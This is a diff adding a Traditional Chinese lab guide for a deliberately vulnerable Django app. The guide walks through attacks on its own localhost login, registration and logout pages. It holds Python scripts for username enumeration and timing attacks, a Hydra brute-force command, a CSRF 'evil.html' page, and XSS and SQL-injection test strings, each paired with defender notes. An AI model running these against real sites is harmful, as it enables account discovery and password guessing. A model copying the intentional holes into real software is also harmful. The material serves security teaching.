@@ -275,14 +275,343 @@
 
 ---
 
-## 下一步（進入 Phase 2）
+## Phase 2：實戰攻擊指南
 
-當你能夠清楚回答以下問題時，Phase 1 就完成了：
+### 🎯 本階段學習重點
 
-1. ✅ 系統有哪些輸入點？
-2. ✅ 哪些地方需要檢查權限？
-3. ✅ 哪些資料不應該信任使用者？
-4. ✅ 有哪些隱藏的 admin 或 internal endpoints？
-5. ✅ 每個功能最可能出現什麼漏洞？
+**理解「攻擊者思維」**：
 
-**準備好進入 Phase 2 時**，我們將開始實作這些功能，並**刻意**引入特定漏洞供後續學習修復。
+1. **輸入驗證繞過** - 如何繞過前端和後端的驗證
+2. **資訊收集** - 如何透過錯誤訊息、回應時間收集情報
+3. **權限邊界測試** - 如何測試是否能存取不屬於自己的資料
+4. **自動化攻擊** - 如何使用工具進行大量測試
+
+**防禦者視角**：
+
+1. 理解每個漏洞的**根本原因**
+2. 知道**如何檢測**這些攻擊
+3. 學習**修復方法**和**最佳實踐**
+
+---
+
+### 📋 目前已實作的功能與漏洞
+
+| 功能       | URL                   | 已引入的漏洞                              | 嚴重程度 |
+| ---------- | --------------------- | ----------------------------------------- | -------- |
+| 使用者註冊 | `/accounts/register/` | 使用者列舉、弱密碼、無 Rate Limiting      | 中       |
+| 使用者登入 | `/accounts/login/`    | Timing Attack、資訊洩漏、無 Rate Limiting | 高       |
+| 使用者登出 | `/accounts/logout/`   | CSRF on Logout                            | 中       |
+
+---
+
+### 🧪 測試操作指引
+
+#### 1. 正常功能測試（白箱）
+
+**目的**：了解系統預期行為
+
+```bash
+# 1. 註冊一個新帳號
+瀏覽器訪問: http://localhost:8000/accounts/register/
+- 使用者名稱: testuser
+- Email: test@example.com
+- 密碼: 123456 (刻意使用弱密碼)
+✅ 應該註冊成功
+
+# 2. 登入
+瀏覽器訪問: http://localhost:8000/accounts/login/
+- 使用者名稱: testuser
+- 密碼: 123456
+✅ 應該登入成功
+
+# 3. 登出
+點擊導航列的「登出」按鈕
+✅ 應該登出成功
+```
+
+#### 2. 邊界測試（灰箱）
+
+**目的**：測試系統在異常輸入下的行為
+
+```bash
+# 測試 1：超長使用者名稱
+使用者名稱: aaaaaaaaaaaaaaaaaaaaaaaa...(超過 150 字元)
+❓ 系統會拒絕還是截斷？
+
+# 測試 2：特殊字元
+使用者名稱: admin<script>alert(1)</script>
+❓ 系統會過濾嗎？
+
+# 測試 3：SQL 注入字元
+使用者名稱: admin' OR '1'='1
+❓ 會觸發錯誤嗎？
+
+# 測試 4：空密碼
+密碼: (留空)
+❓ 前端會阻止還是後端會檢查？
+```
+
+---
+
+### 🔴 攻擊實戰演練
+
+#### 攻擊 1：使用者名稱列舉（User Enumeration）
+
+**漏洞位置**：`/accounts/register/`
+
+**攻擊目的**：收集系統中存在的使用者名稱
+
+**攻擊步驟**：
+
+```bash
+# 方法 1：手動測試
+1. 訪問註冊頁面
+2. 嘗試註冊 "admin"
+   ✅ 如果顯示「此使用者名稱已被使用」→ admin 帳號存在
+   ❌ 如果顯示其他錯誤 → admin 帳號不存在
+
+# 方法 2：使用 Burp Suite Intruder
+1. 攔截註冊請求
+2. 將 username 欄位標記為 payload 位置
+3. 載入常見使用者名稱字典（admin, root, user, test...）
+4. 啟動攻擊
+5. 分析回應：
+   - 狀態碼 200 + "此使用者名稱已被使用" → 存在
+   - 狀態碼 200 + 其他訊息 → 不存在
+
+# 方法 3：使用 Python 腳本自動化
+```
+
+**Python 攻擊腳本範例**：
+
+```python
+import requests
+
+target = "http://localhost:8000/accounts/register/"
+usernames = ["admin", "root", "user", "test", "administrator"]
+
+# 先取得 CSRF token
+session = requests.Session()
+response = session.get(target)
+csrf_token = session.cookies.get('csrftoken')
+
+for username in usernames:
+    data = {
+        'username': username,
+        'email': 'test@test.com',
+        'password': 'password123',
+        'password_confirm': 'password123',
+        'csrfmiddlewaretoken': csrf_token
+    }
+
+    response = session.post(target, data=data)
+
+    if "此使用者名稱已被使用" in response.text:
+        print(f"[+] 找到使用者: {username}")
+    else:
+        print(f"[-] 使用者不存在: {username}")
+```
+
+**防禦者應該看到什麼**：
+
+- 大量來自同一 IP 的註冊請求
+- 相同的 email 但不同的 username
+
+---
+
+#### 攻擊 2：Timing Attack（時間側信道攻擊）
+
+**漏洞位置**：`/accounts/login/`
+
+**攻擊目的**：透過回應時間判斷帳號是否存在
+
+**攻擊原理**：
+
+- 帳號存在 → 驗證密碼（有 sleep(0.1)）→ 回應較慢
+- 帳號不存在 → 立即返回錯誤 → 回應較快
+
+**攻擊步驟**：
+
+```bash
+# 方法 1：手動測試（使用瀏覽器開發者工具）
+1. 打開開發者工具 → Network
+2. 測試存在的帳號：
+   - 使用者名稱: testuser (已註冊)
+   - 密碼: wrongpassword
+   - 觀察 Network 的 Time 欄位 (應該 > 100ms)
+
+3. 測試不存在的帳號：
+   - 使用者名稱: nonexistuser
+   - 密碼: anything
+   - 觀察 Network 的 Time 欄位 (應該 < 50ms)
+
+# 方法 2：使用 cURL 測試
+time curl -X POST http://localhost:8000/accounts/login/ \
+  -d "username=testuser&password=wrong" \
+  -H "Content-Type: application/x-www-form-urlencoded"
+```
+
+**Python 攻擊腳本**：
+
+```python
+import requests
+import time
+
+target = "http://localhost:8000/accounts/login/"
+usernames = ["admin", "test", "user", "nonexist"]
+
+session = requests.Session()
+response = session.get(target)
+csrf_token = session.cookies.get('csrftoken')
+
+for username in usernames:
+    data = {
+        'username': username,
+        'password': 'wrongpassword',
+        'csrfmiddlewaretoken': csrf_token
+    }
+
+    start_time = time.time()
+    response = session.post(target, data=data)
+    elapsed_time = time.time() - start_time
+
+    print(f"{username}: {elapsed_time:.3f}秒")
+
+    # 如果回應時間 > 0.1 秒，可能帳號存在
+    if elapsed_time > 0.1:
+        print(f"  [!] 可能存在的帳號: {username}")
+```
+
+---
+
+#### 攻擊 3：暴力破解（Brute Force）
+
+**漏洞位置**：`/accounts/login/`
+
+**攻擊目的**：嘗試所有可能的密碼組合
+
+**攻擊步驟**：
+
+```bash
+# 使用 Hydra 進行暴力破解
+hydra -l testuser -P /usr/share/wordlists/rockyou.txt \
+  localhost -s 8000 http-post-form \
+  "/accounts/login/:username=^USER^&password=^PASS^:密碼錯誤"
+
+# 使用 Burp Suite Intruder
+1. 攔截登入請求
+2. 將 password 欄位標記為 payload
+3. 載入密碼字典
+4. 啟動攻擊
+5. 尋找狀態碼或回應內容不同的請求
+```
+
+**防禦者應該看到什麼**：
+
+- 短時間內大量失敗的登入嘗試
+- 來自同一 IP 或 session
+
+---
+
+#### 攻擊 4：CSRF on Logout（跨站請求偽造）
+
+**漏洞位置**：`/accounts/logout/`
+
+**攻擊目的**：在受害者不知情的情況下登出其帳號
+
+**攻擊原理**：
+
+- 登出使用 GET 方法
+- 沒有 CSRF token 驗證
+- 任何網站都可以觸發登出請求
+
+**攻擊步驟**：
+
+```html
+<!-- 攻擊者建立一個惡意網頁 evil.html -->
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>免費贈品！</title>
+  </head>
+  <body>
+    <h1>恭喜！你獲得了免費贈品！</h1>
+    <p>請等待...</p>
+
+    <!-- 🔴 自動登出受害者 -->
+    <img src="http://localhost:8000/accounts/logout/" style="display:none;" />
+
+    <!-- 或使用 JavaScript -->
+    <script>
+      fetch("http://localhost:8000/accounts/logout/", {
+        credentials: "include", // 包含受害者的 cookie
+      });
+    </script>
+  </body>
+</html>
+```
+
+**測試步驟**：
+
+1. 在 `http://localhost:8000` 登入
+2. 開啟上述 `evil.html`
+3. 回到 `http://localhost:8000`
+4. ✅ 你已被登出
+
+---
+
+#### 攻擊 5：弱密碼攻擊
+
+**漏洞位置**：`/accounts/register/`
+
+**攻擊目的**：建立弱密碼帳號，方便後續攻擊
+
+**攻擊步驟**：
+
+```bash
+# 測試各種弱密碼
+密碼: 123456     ✅ 應該成功
+密碼: password   ✅ 應該成功
+密碼: admin      ✅ 應該成功
+密碼: 111111     ✅ 應該成功
+密碼: a          ✅ 應該成功（長度為 1）
+```
+
+---
+
+### 🛠️ 推薦攻擊工具
+
+| 工具                 | 用途                 | 使用場景                       |
+| -------------------- | -------------------- | ------------------------------ |
+| **Burp Suite**       | Web 應用程式安全測試 | 攔截請求、自動化攻擊、漏洞掃描 |
+| **OWASP ZAP**        | 開源 Web 安全掃描器  | 自動化漏洞掃描                 |
+| **Hydra**            | 暴力破解工具         | 測試登入的強度                 |
+| **Python Requests**  | HTTP 請求庫          | 撰寫自訂攻擊腳本               |
+| **cURL**             | 命令列 HTTP 工具     | 快速測試 API endpoint          |
+| **Browser DevTools** | 瀏覽器開發者工具     | 檢查 Network、修改請求         |
+
+---
+
+### ✅ 檢查清單
+
+完成以下測試後，你就完全理解了這些漏洞：
+
+- [ ] 成功列舉出至少 3 個存在的使用者名稱
+- [ ] 透過 Timing Attack 區分帳號存在/不存在
+- [ ] 撰寫 Python 腳本自動化使用者列舉
+- [ ] 使用 Burp Suite 進行暴力破解測試
+- [ ] 建立 CSRF 攻擊頁面成功登出受害者
+- [ ] 註冊至少 5 種不同的弱密碼帳號
+- [ ] 理解每個漏洞的**根本原因**
+- [ ] 提出每個漏洞的**修復方案**
+
+---
+
+### 📚 延伸學習
+
+**下一步**：
+
+1. 記錄每個成功的攻擊方法
+2. 思考：「如果我是開發者，如何防禦這些攻擊？」
+3. 閱讀 OWASP Top 10 中的相關章節
+4. 準備進入 Phase 3：威脅建模與修復
